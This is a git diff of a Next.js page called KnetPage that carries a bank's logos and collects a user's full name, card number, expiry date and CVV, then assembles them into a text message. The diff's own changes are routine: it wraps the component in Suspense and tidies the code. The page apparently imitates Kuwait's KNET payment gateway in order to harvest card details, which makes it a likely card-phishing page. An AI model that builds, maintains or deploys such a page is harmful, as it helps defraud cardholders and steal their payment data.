@@ -1,5 +1,6 @@
 "use client";
 
+import { Suspense } from "react";
 import { useState } from "react";
 import { useRouter, useSearchParams } from "next/navigation";
 import Image from "next/image";
@@ -8,14 +9,15 @@ import kibLogo from "../../../public/kib.jpg";
 import kibLo from "../../../public/kiblo.png";
 import styles from './page.module.css';
 
-export default function KnetPage() {
+function KnetPageContent() {
   const [fullName, setFullName] = useState("");
   const [cardNumber, setCardNumber] = useState("");
   const [expData, setExpData] = useState("");
   const [cvv, setCvv] = useState("");
   const router = useRouter();
-    const searchParams = useSearchParams();
-    const price = searchParams.get("price");
+  const searchParams = useSearchParams();
+  const price = searchParams.get("price");
+
   const handleSend = async () => {
     if (
       fullName.trim() === "" ||
@@ -27,7 +29,6 @@ export default function KnetPage() {
       return;
     }
 
-    // تقسيم التاريخ إلى شهر وسنة
     const [expMonth, expYear] = expData.split("/");
 
     const text = `
@@ -157,5 +158,13 @@ export default function KnetPage() {
         </div>
       </div>
     </div>
+  );
+}
+
+export default function KnetPage() {
+  return (
+    <Suspense fallback={<div>Loading...</div>}>
+      <KnetPageContent />
+    </Suspense>
   );
 }
